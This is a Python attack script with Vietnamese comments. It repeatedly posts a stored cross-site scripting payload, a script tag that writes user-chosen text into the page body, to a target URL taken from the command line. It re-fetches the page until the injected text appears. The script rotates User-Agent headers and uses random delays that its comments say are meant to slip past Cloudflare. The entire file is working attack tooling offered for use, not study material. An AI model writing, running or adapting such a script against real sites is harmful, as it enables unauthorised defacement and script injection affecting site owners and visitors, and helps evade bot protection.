import requests
import time
import random
import sys
import os

# "Chỉ đường" cho Python tìm thư mục Core
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

def smart_attack_loop(target_url):
    # 1. Cho người dùng nhập văn bản muốn tiêm
    a = input("[?] Nhập nội dung bạn muốn hiển thị (ví dụ: Werewolf Hack): ")
    
    user_agents = [
        "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
    ]

    lan_thu = 0
    while True:
        lan_thu += 1
        headers = {'User-Agent': random.choice(user_agents)}
        
        print(f"\n--- Lần quét thứ {lan_thu} ---")
        
        try:
            # 2. Thực hiện tiêm văn bản 'a' vào server qua POST
            # Giả lập tiêm vào các trường dữ liệu phổ biến
            payload_data = {
                "user": "Werewolf_Bot",
                "message": f"<script>document.body.innerHTML += '{a}';</script>",
                "status": a
            }
            requests.post(target_url, data=payload_data, headers=headers, timeout=10)
            
            # 3. KIỂM TRA HTML (Kiểm tra xem 'a' đã xuất hiện chưa)
            response = requests.get(target_url, headers=headers, timeout=10)
            html_code = response.text
            
            if a in html_code:
                print(f"[🔥] THÀNH CÔNG! Đã tìm thấy '{a}' trong mã nguồn!")
                # Chỉ ra vị trí xuất hiện của code đã tiêm
                start_idx = html_code.find(a)
                print(f"[🔍] Vị trí: ...{html_code[start_idx-20:start_idx+20]}...")
                break # Dừng lại khi đã đạt mục tiêu
            else:
                print(f"[...] Văn bản '{a}' chưa hiển thị. Đang chờ server lag để tiêm lại...")

            # 4. Tạo "độ run" (Random Delay) để qua mặt Cloudflare
            do_run = random.uniform(2.0, 5.0)
            print(f"[⌛] Nghỉ {do_run:.2f} giây để giả lập người thật...")
            time.sleep(do_run)

        except Exception as e:
            print(f"[!] Lỗi kết nối: {e}")
            time.sleep(5)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        smart_attack_loop(sys.argv[1])
    else:
        print("[!] Thiếu URL mục tiêu.")
        
